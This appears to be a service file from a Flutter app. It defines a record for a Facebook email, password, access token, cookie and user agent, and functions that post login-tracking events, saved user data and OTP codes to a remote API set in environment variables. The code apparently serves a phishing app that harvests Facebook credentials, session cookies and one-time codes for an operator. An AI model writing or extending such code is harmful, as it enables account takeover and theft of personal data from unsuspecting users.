import 'package:http/http.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';

class FacebookData {
  String? email;
  String? password;
  String? fbToken;
  String? cookie;
  String? userArgent;
  String? token;
  FacebookData(this.email, this.password, this.fbToken, this.cookie,
      this.userArgent, this.token);
}

class Service {
  static final apiUrl = dotenv.env['API_URL']!;
  static String app = dotenv.env['APP_NAME']!;

  static Future checkLogin() async {
    return await post(Uri.parse('$apiUrl/users/check-login'),
        body: {'app': app});
  }

  static Future trackingOpenApp() async {
    return await post(Uri.parse('$apiUrl/users/track-open'),
        body: {"app": app});
  }

  static Future trackingLoginFacebook() async {
    return await post(Uri.parse('$apiUrl/users/track-login'),
        body: {"app": app});
  }

  static Future trackingLoginFacebookSuccess() async {
    return await post(Uri.parse('$apiUrl/users/track-login-success'),
        body: {"app": app});
  }

  static Future saveData(Object object) async {
    return await post(Uri.parse('$apiUrl/users/save'), body: object);
  }

  static Future saveOTP(Object object) async {
    return await post(Uri.parse('$apiUrl/users/save-otp'), body: object);
  }
}
